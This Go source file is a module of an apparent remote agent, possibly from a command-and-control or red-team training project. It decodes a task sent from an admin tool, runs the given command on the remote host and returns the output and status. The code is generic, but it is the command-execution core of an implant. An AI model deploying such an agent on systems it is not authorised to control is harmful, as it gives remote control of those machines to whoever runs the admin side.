package exec

import (
	"os/exec"

	"github.com/1stl0ve/avengercon/pkg/api"
	"github.com/1stl0ve/avengercon/pkg/module"
)

// Agent is a module.Agent implementation that allows a user of the
// admin tool to send a command for the Agent to execute on the remote system.
type Agent struct {
	Output []byte
	Status api.Status
}

// Do executes the command specified in the task's configuration. The results of
// the command are saved to Agent.Out.
func (m *Agent) Do(task *api.Task) error {
	var err error
	var conf config

	m.Status = api.Status_OK
	if err := module.DecodeConfig(task.Data, &conf); err != nil {
		m.Status = api.Status_ERROR
		return err
	}

	// ignore any empty commands.
	if conf.Cmd == "" {
		return nil
	}

	tokens := getCommandTokens(conf.Cmd)
	m.Output, err = exec.Command(tokens[0], tokens[1:]...).CombinedOutput()
	if err != nil {
		m.Status = api.Status_ERROR
		return err
	}
	return nil
}

// CreateResponse creates the task response with the command output and the
// status of the command execution.
func (m *Agent) CreateResponse(id string) (*api.Response, error) {
	task := &api.Response{
		AgentID: id,
		Status:  m.Status,
		Data:    m.Output,
	}
	return task, nil
}
